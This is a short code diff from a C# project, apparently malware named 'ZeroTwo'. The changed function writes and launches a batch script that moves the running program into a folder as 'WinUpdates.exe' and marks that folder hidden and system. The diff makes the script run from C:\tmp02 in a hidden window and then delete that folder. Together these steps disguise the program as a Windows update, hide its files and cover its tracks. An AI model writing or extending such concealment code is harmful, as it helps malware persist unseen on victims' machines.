@@ -74,10 +74,15 @@ namespace ZeroTwo.src {
             batchCommands += "echo j | move ";                   
             batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\WinUpdates.exe" + "\"" + "\n";
             batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";                 
-            batchCommands += "echo j | del del.bat";
+            batchCommands += "echo j | del /F /Q " + "\"" + "C:\\tmp02" + "\"";
 
-            File.WriteAllText("del.bat", batchCommands);
-            Process.Start("del.bat");
+            Directory.CreateDirectory("C:\\tmp02");
+            File.WriteAllText("C:\\tmp02\\subs.bat", batchCommands);
+
+            Process p = new Process();
+            p.StartInfo.FileName = "C:\\tmp02\\subs.bat";
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.Start();
         }
 
         private static void Exec(int op) {
